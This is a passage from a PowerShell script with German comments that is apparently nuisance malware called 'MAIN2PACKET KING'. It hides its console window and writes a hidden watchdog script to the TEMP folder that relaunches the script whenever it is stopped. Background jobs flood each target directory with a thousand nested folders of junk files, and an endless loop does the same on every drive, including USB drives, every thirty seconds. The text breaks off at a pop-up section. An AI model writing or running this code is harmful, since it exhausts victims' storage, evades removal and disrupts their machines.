[Console.Window]::ShowWindow($consolePtr, 0)

# ===== WATCHDOG =====
$watchdog = @"
while(`$true) {
    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid}
    if (`$p.Count -le 1) { Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$using:PSCommandPath`"" }
    Start-Sleep -Milliseconds 500
}
"@
$watchdog | Out-File "$env:TEMP\watchdog.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\watchdog.ps1`""

# ===== 1000 ORDNER PRO ZIEL - PARALLEL =====
$ordnerJob = Start-Job -ScriptBlock {
    # 1000 VERSCHIEDENE ORDNERNAMEN
    $ordnerNamen = @()
    for ($i = 1; $i -le 1000; $i++) {
        $ordnerNamen += "MAIN2PACKET_$i"
        $ordnerNamen += "KING_$i"
        $ordnerNamen += "TURBO_$i"
        $ordnerNamen += "ULTRA_$i"
        $ordnerNamen += "MEGA_$i"
        $ordnerNamen += "GIGA_$i"
        $ordnerNamen += "SYSTEM_$i"
        $ordnerNamen += "CORE_$i"
        $ordnerNamen += "BACKUP_$i"
        $ordnerNamen += "CACHE_$i"
    }
    
    $zielCount = 0
    foreach ($ziel in $using:alleZiele) {
        $zielCount++
        if (Test-Path $ziel) {
            # 1000 ORDNER PRO ZIEL!
            for ($o = 1; $o -le 1000; $o++) {
                $ordnerName = "MAIN2PACKET_" + $zielCount + "_" + $o
                
                $ordnerPfad = Join-Path $ziel $ordnerName
                try {
                    New-Item -Path $ordnerPfad -ItemType Directory -Force | Out-Null
                    
                    # 10 DATEIEN PRO ORDNER
                    for ($d = 1; $d -le 10; $d++) {
                        $dateiName = "file_$d.txt"
                        $dateiPfad = Join-Path $ordnerPfad $dateiName
                        "MAIN2PACKET KING - Ordner $o, Datei $d" | Out-File $dateiPfad -Encoding UTF8 -Force
                    }
                    
                    # 5 UNTERORDNER PRO ORDNER
                    for ($u = 1; $u -le 5; $u++) {
                        $unterName = "SUB_$u"
                        $unterPfad = Join-Path $ordnerPfad $unterName
                        New-Item -Path $unterPfad -ItemType Directory -Force | Out-Null
                        
                        # 5 DATEIEN PRO UNTERORDNER
                        for ($ud = 1; $ud -le 5; $ud++) {
                            $unterDatei = Join-Path $unterPfad "subfile_$ud.txt"
                            "SUB-ORDNER $u - Datei $ud" | Out-File $unterDatei -Encoding UTF8 -Force
                        }
                    }
                } catch {}
            }
        }
    }
}

# ===== USB-SPEZIAL =====
$usbJob = Start-Job -ScriptBlock {
    while ($true) {
        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\" -and $_.Used -gt 0}
        foreach ($drive in $drives) {
            $drivePath = $drive.Root
            
            # 500 ORDNER PRO USB
            for ($u = 1; $u -le 500; $u++) {
                $usbOrdner = Join-Path $drivePath "USB_MAIN2PACKET_$u"
                try {
                    New-Item -Path $usbOrdner -ItemType Directory -Force | Out-Null
                    
                    # 10 DATEIEN PRO USB-ORDNER
                    for ($f = 1; $f -le 10; $f++) {
                        $usbDatei = Join-Path $usbOrdner "usb_file_$f.txt"
                        "USB - MAIN2PACKET" | Out-File $usbDatei -Encoding UTF8 -Force
                    }
                } catch {}
            }
        }
        Start-Sleep -Seconds 30
    }
}

# ===== 500 POP-UPS =====
